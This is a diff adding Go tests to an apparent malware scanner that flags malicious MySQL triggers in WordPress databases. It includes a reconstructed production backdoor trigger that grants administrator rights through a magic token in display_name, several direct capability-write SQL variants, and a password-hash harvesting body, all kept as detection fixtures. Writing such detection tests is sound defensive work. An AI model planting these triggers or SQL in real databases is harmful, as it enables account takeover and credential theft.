@@ -329,3 +329,131 @@ func TestIsDBObjectKindRejects(t *testing.T) {
 		}
 	}
 }
+
+// --- High-risk body shapes (role escalation, magic-token, password exfil) --
+//
+// Reconstruction of the 2026-05-15 production incident: a WordPress account
+// was found carrying a MySQL trigger that promoted any subscriber/customer
+// to administrator when they edited their profile display_name to contain
+// a hidden activation token. The trigger body neither used sys_exec nor
+// touched a file, so the pre-2026-05-15 classifier marked it Warning. The
+// shape is unambiguously malicious -- no legitimate plugin promotes users
+// via raw UPDATE on capabilities meta -- and must classify Critical.
+
+const todaysRoleEscalationTrigger = `BEGIN
+    DECLARE v_capabilities varchar(50);
+    IF NEW.display_name LIKE '%Lei5pahtebue%' THEN
+        IF NEW.display_name LIKE '%grant%' THEN
+            SET v_capabilities = 'a:1:{s:13:"administrator";b:1;}';
+        ELSE
+            SET v_capabilities = 'a:1:{s:8:"customer";b:1;}';
+        END IF;
+        UPDATE ` + "`wpxd_usermeta`" + ` SET meta_value = v_capabilities
+        WHERE user_id = NEW.ID AND meta_key = 'wpxd_capabilities';
+    END IF;
+END`
+
+func TestBodyHasMalwarePattern_RoleEscalationTrigger(t *testing.T) {
+	if !bodyHasMalwarePattern(todaysRoleEscalationTrigger) {
+		t.Error("role-escalation trigger (UPDATE usermeta SET capabilities=administrator) must classify as malicious")
+	}
+}
+
+func TestBodyHasMalwarePattern_MagicTokenDisplayNameGate(t *testing.T) {
+	// Synthetic: trigger gates a privileged action on a magic token in a
+	// user-controllable field. Capability write absent here -- the magic
+	// token shape alone is enough to flag.
+	body := `BEGIN
+    IF NEW.display_name LIKE '%Xq7BzPmNa2Lf%' THEN
+        INSERT INTO audit_log VALUES (NEW.ID);
+    END IF;
+END`
+	if !bodyHasMalwarePattern(body) {
+		t.Error("magic-token-gated trigger (display_name LIKE '%<random>%') must classify as malicious -- no legitimate plugin uses public profile fields as activation tokens")
+	}
+}
+
+func TestBodyHasMalwarePattern_RoleEscalationVariants(t *testing.T) {
+	cases := []struct {
+		name string
+		body string
+	}{
+		{
+			"direct capability write to administrator (single-quoted)",
+			`UPDATE wpxd_usermeta SET meta_value = 'a:1:{s:13:"administrator";b:1;}' WHERE meta_key = 'wpxd_capabilities'`,
+		},
+		{
+			"direct capability write via concat (escaped json)",
+			`UPDATE wp_usermeta SET meta_value = CONCAT('a:1:{s:13:', '"administrator"', ';b:1;}') WHERE meta_key = 'wp_capabilities'`,
+		},
+		{
+			"role write into custom prefix table",
+			`UPDATE abc_usermeta SET meta_value='a:1:{s:13:"administrator";b:1;}' WHERE meta_key='abc_capabilities'`,
+		},
+	}
+	for _, c := range cases {
+		if !bodyHasMalwarePattern(c.body) {
+			t.Errorf("variant %q must classify as malicious", c.name)
+		}
+	}
+}
+
+func TestBodyHasMalwarePattern_PasswordExfilRead(t *testing.T) {
+	// An attacker proc/trigger that pulls password hashes for offline
+	// cracking is a Critical signal regardless of where it writes.
+	body := `BEGIN
+    SELECT user_pass FROM wp_users INTO @h;
+    INSERT INTO staging.dump VALUES (@h);
+END`
+	if !bodyHasMalwarePattern(body) {
+		t.Error("password-hash read (SELECT user_pass FROM ...) must classify as malicious")
+	}
+}
+
+func TestBodyHasMalwarePattern_LegitTriggersStaySilent(t *testing.T) {
+	// Negative reconstructions: plausible legitimate triggers that share
+	// surface tokens (display_name, wp_usermeta, capabilities) but lack
+	// the privileged-write shape. None must classify as malicious -- they
+	// fall through to the Warning tier (unexpected trigger).
+	cases := []struct {
+		name string
+		body string
+	}{
+		{
+			"audit trigger logging display_name changes",
+			`BEGIN
+    IF OLD.display_name <> NEW.display_name THEN
+        INSERT INTO audit_log (user_id, old, new) VALUES (NEW.ID, OLD.display_name, NEW.display_name);
+    END IF;
+END`,
+		},
+		{
+			"usermeta touch updating a benign field",
+			`UPDATE wp_usermeta SET meta_value = NOW() WHERE meta_key = 'last_active'`,
+		},
+		{
+			"trigger writing capabilities to subscriber (not admin)",
+			// Promotion to subscriber on signup is benign WP-like flow.
+			`UPDATE wp_usermeta SET meta_value = 'a:1:{s:10:"subscriber";b:1;}' WHERE meta_key = 'wp_capabilities'`,
+		},
+	}
+	for _, c := range cases {
+		if bodyHasMalwarePattern(c.body) {
+			t.Errorf("benign body %q must not classify as malicious", c.name)
+		}
+	}
+}
+
+func TestDBObjectFindingToFinding_RoleEscalationBecomesCriticalTrigger(t *testing.T) {
+	h := classifyDBObject("kayraaromasro", "kayraaromasro_wp102", dbObjectTrigger, "wpxd_hash_password", todaysRoleEscalationTrigger)
+	if !h.IsMalw {
+		t.Fatal("today's trigger must classify IsMalw=true")
+	}
+	f := h.toFinding()
+	if f.Severity != alert.Critical {
+		t.Errorf("severity = %v, want Critical", f.Severity)
+	}
+	if f.Check != "db_malicious_trigger" {
+		t.Errorf("check = %q, want db_malicious_trigger", f.Check)
+	}
+}
